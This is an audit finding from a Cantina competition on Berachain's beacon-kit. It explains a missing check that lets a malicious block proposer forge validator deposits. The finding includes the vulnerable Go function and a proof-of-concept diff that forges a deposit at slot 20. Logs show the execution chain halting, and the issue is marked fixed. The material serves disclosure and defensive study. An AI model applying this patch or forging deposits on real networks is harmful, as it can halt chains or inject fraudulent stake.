---
tags:
  - lang/solidity
  - sector/governance
  - sector/staking
  - platform/cantina
  - has/poc
  - severity/high
  - novelty/variant
protocol: "[[Berachain]]"
auditors:
  - "[[Haxatron]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_berachain_january2025.pdf"
genome:
  - "[[wrong-condition]]"
  - "[[variant]]"
  - "[[permanent]]"
  - "[[proposal-state-check]]"
---
# Deposits can be forged due to incorrect check in validateNonGenesisDeposits 

- id: 53120
- impact: HIGH
- protocol: [[Berachain]]
- reporter: Haxatron (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_berachain_january2025.pdf

## Summary


The bug report discusses a problem in the ProcessProposal function where a crucial check is missing. This allows a malicious proposer to forge arbitrary deposits in blkDeposits, which can be accepted by validators as long as the blkDepositRoot matches the deposit root computed from the deposit store. This can lead to the execution chain halting and the consensus chain continuing. A proof of concept is provided and a recommendation is made to validate blkDeposits against what is actually present in the deposit store. The bug has been fixed in a commit.

## Details

## Context
(No context files were provided by the reviewer)

## Description
In `ProcessProposal`, during validation of the deposits, we perform the following steps:

- First, fetch the deposit index.
- Ensure `blkDeposits` is contiguous.
- Check that the `blkDepositRoot` matches the deposit root computed from `(0, depositIndex + len(blkDeposits))` from the deposit store.

## Code Snippet
```go
validation_deposits.go#L69-L99:
func (sp *StateProcessor[
    _, _,
]) validateNonGenesisDeposits(
    st *statedb.StateDB,
    blkDeposits []*ctypes.Deposit,
    blkDepositRoot common.Root,
) error {
    depositIndex, err := st.GetEth1DepositIndex()
    if err != nil {
        return err
    }
    for i, deposit := range blkDeposits {
        // deposit indices should be contiguous
        if deposit.GetIndex() != math.U64(depositIndex)+math.U64(i) {
            return errors.Wrapf(ErrDepositIndexOutOfOrder,
                "deposit index: %d, expected index: %d", deposit.GetIndex().Unwrap(), i,
            )
        }
    }
    var deposits ctypes.Deposits
    deposits, err = sp.ds.GetDepositsByIndex(0, depositIndex+uint64(len(blkDeposits)))
    if err != nil {
        return err
    }
    if !blkDepositRoot.Equals(deposits.HashTreeRoot()) {
        return ErrDepositsRootMismatch
    }
    return nil
}
```

However, there is a very crucial check missing that allows forging arbitrary deposits in `blkDeposits`. The `blkDeposits` and `blkDepositRoot` are fetched from the beacon block, which can be malicious; however, it is not correctly verified that the two are correlated in the code above.

Essentially, a malicious proposer can forge arbitrary `blkDeposits`. They only need to compute `blkDepositRoot` that matches the deposit root of `(0, depositIndex + len(blkDeposits))` from the deposit store for validators to accept the block. Note that `blkDepositRoot` is computed by the proposer, so the proposer has full control over this value. Here we can see the underlying problem: there is no actual validation of the contents of the `blkDeposits` being performed.

Let's denote `blkDeposits` as **D**, `blkDepositRoot` as **R**, and the actual deposit store root as **S**. In beacon-kit, the honest proposer obtains **D** and **R** from the deposit store and will send (**D**, **R**) to the validator. The validator performs the following check:

- Check that **D** is contiguous and **R = S**:

However, this check can be bypassed since a malicious proposer can forge malicious deposits **D'**, then obtain **R** from the deposit store and send (**D'**, **R**) to the validator, which will pass the checks since **D'** is contiguous and **R = S**.

## Proof of Concept
Apply the following diff to the codebase using `git apply patch.diff --ignore-whitespace`. This causes a malicious proposer to forge a deposit at block = 20.

```diff
diff --git a/beacon/validator/block_builder.go b/beacon/validator/block_builder.go
index 6d2060d57..f0608a5c5 100644
--- a/beacon/validator/block_builder.go
+++ b/beacon/validator/block_builder.go
@@ -323,7 +323,16 @@ func (s *Service[_]) buildBlockBody(
     "Building block body with local deposits",
     "start_index", depositIndex, "num_deposits", uint64(len(deposits))-depositIndex,
 )
-    body.SetDeposits(deposits[depositIndex:])
+
+    // Let's forge some deposits
+    if blk.GetSlot() == 20 {
+        maliciousDeposits := deposits[0:1] // Get the first deposit
+        maliciousDeposits[0].Amount = math.Gwei(1000000000) // Forge a 1 ETH deposit
+        maliciousDeposits[0].Index = depositIndex
+        body.SetDeposits(maliciousDeposits)
+    } else {
+        body.SetDeposits(deposits[depositIndex:])
+    }
 // Set the graffiti on the block body.
 sizedGraffiti := bytes.ExtendToSize([]byte(s.cfg.Graffiti), bytes.B32Size)
```

After this is proposed by the malicious proposer and accepted by the chain, the honest proposer will receive an error when preparing a proposal and thus propose empty proposals. This will lead to the consensus chain continuing but the execution chain effectively halting:

```
2025-01-16T15:03:48Z INFO Finalized block module=state height=71 num_txs_res=0 num_val_updates=0 block_app_hash=89815EFF64653E842CF867929EABE27F00FB5C68D87BE68FC5747AA7CAC623AF syncing_to_height=71,
2025-01-16T15:03:48Z INFO Committed state module=state height=71 block_app_hash=89815EFF64653E842CF867929EABE27F00FB5C68D87BE68FC5747AA7CAC623AF,
2025-01-16T15:03:48Z INFO indexed block events module=txindex height=71
2025-01-16T15:03:50Z INFO Timed out module=consensus dur=1857.861080 height=72 round=0 step=RoundStepNewHeight
2025-01-16T15:03:50Z INFO Forkchoice updated service=execution-engine head_block_hash=0x671b48caa16ed2ce728300f2643701edcdc14804efd5686923ddca637c1f03b1 safe_block_hash=0xbac4d018922d315a73853bbccd21c4acdf92f43f0d7b0a0ddca4c23065607af5 finalized_block_hash=0xbac4d018922d315a73853bbccd21c4acdf92f43f0d7b0a0ddca4c23065607af5 with_attributes=true payload_id=0x030c51242ae8e594
2025-01-16T15:03:50Z INFO Waiting for local payload to be delivered to execution client service=payload-builder for_slot=72 timeout=2.5s
2025-01-16T15:03:53Z ERRR failed to prepare proposal height=72 err=all historical deposits not available, expected: 5, got: 4: deposits from deposit store incomplete,
```

Note that the chain halt occurs because the deposit index is now 5, which is greater than the number of deposits in the deposit store. If there was a 5th deposit, then the chain wouldn't halt and would progress normally, with the forged deposit being applied to the validator set.

## Recommendation
You need to validate `blkDeposits` against what is actually present in the deposit store, for example by fetching `sp.ds.GetDepositsByIndex(depositIndex, depositIndex + len(blkDeposits))` and checking that all are equal to `blkDeposits`.

**Berachain:** Fixed in commit 7b024118.
